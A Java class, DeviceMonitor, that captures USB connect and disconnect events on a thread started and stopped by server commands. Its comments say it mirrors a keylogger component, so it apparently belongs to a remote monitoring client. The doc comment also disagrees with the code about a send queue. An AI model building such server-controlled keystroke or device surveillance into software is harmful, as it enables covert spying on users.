package com.acs;

/**
 * Client-side wrapper that owns the DeviceDetector and routes all captured
 * USB connect/disconnect events into the send queue as "USB:<data>" messages.
 *
 * Mirrors the KeylogMonitor pattern exactly:
 *   DeviceMonitor monitor = new DeviceMonitor(sendQueue);
 *   monitor.start();   // called when server sends START_USB
 *   monitor.stop();    // called when server sends STOP_USB
 *
 * Note: DeviceDetector.start() blocks on its detection loop (Windows message
 * pump / Linux udevadm), so we run it directly on the thread rather than
 * parking after it like KeylogMonitor does with JNativeHook.
 */
public class DeviceMonitor {

    private volatile DeviceDetector deviceDetector = null;
    private volatile boolean        running        = false;
    private volatile Thread         detectorThread = null;

    public DeviceMonitor() {}

    // ── Public API ────────────────────────────────────────────────────────────

    public void start() {
        if (running) {
            System.out.println("[DeviceMonitor] Already running — ignoring duplicate START");
            return;
        }

        running        = true;
        deviceDetector = new DeviceDetector(data -> ClientLogger.write("usb", data));

        detectorThread = new Thread(() -> {
            System.out.println("[DeviceMonitor] Starting DeviceDetector");
            try {
                // start() blocks on the detection loop (message pump / udevadm).
                // It will return only when stop() kills the loop.
                deviceDetector.start();
            } catch (Exception e) {
                System.err.println("[DeviceMonitor] Error: " + e.getMessage());
            } finally {
                running = false;
                System.out.println("[DeviceMonitor] Stopped");
            }
        }, "DeviceDetectorThread");
        detectorThread.setDaemon(true);
        detectorThread.start();
    }

    public void stop() {
        if (!running) return;
        running = false;

        if (deviceDetector != null) {
            deviceDetector.stop(); // posts WM_QUIT (Win) / kills udevadm (Linux)
            deviceDetector = null;
        }

        if (detectorThread != null) {
            detectorThread.interrupt();
            detectorThread = null;
        }

        System.out.println("[DeviceMonitor] Stop requested");
    }

    public boolean isRunning() { return running; }
}
